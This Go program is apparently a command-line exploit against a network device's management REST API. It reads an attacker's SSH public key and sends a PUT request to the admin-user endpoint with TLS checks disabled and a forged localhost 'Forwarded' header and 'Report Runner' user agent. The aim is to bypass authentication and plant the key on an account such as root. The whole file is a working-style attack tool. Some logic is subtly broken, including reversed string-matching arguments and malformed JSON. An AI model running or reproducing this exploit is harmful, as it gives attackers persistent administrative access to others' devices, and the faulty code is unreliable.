package main

import (
	"crypto/tls"
	"io/ioutil"
	"net/http"
	"strings"
	"bytes"
	"flag"
	"fmt"
	"log"
)

func exploit(url string, username string, ssh_key string){

	content, err := ioutil.ReadFile(ssh_key)
    if err != nil {
          log.Fatal(err)
    }
    uri := url + "/api/v2/cmdb/system/admin/" + username
    
	tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: tr}
    jsonData := []byte (`{'ssh-public-key1': '"`+ string(content) +`"'}`)
	fmt.Printf("[+] target: %s\n", url)
	fmt.Printf("[+] username: %s\n", username)
	fmt.Printf("[+] key SSH: %s\n", string(content))
	res, err  := http.NewRequest("put", uri, bytes.NewBuffer(jsonData ))
	if err != nil {
		log.Fatal(err)
	}
	res.Header.Add("User-Agent", `Report Runner`)
	res.Header.Add("Forwarded", `for="[127.0.0.1]:8888";by="[127.0.0.1]:8888"`)
	resp, err := client.Do(res)
	if err != nil {
		log.Fatal(err)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil{
		log.Fatal(err)
	}
	text := string(body)
	fmt.Printf(text)
	if strings.Contains("SSH key is good", text){
		log.Printf("SSH key for %s added successfully!", username)
	}else{
		log.Fatalf("%s is not vulnerable!", url)
	}
}

func main(){
	target := flag.String("url", "http://127.0.0.1", "url target")
	username := flag.String("username", "root", "username to add ssh key")
	ssh_key := flag.String("key", "ssh.keys", "name ssh key file to add username")
	flag.Parse()
	exploit(*target, *username, *ssh_key)
}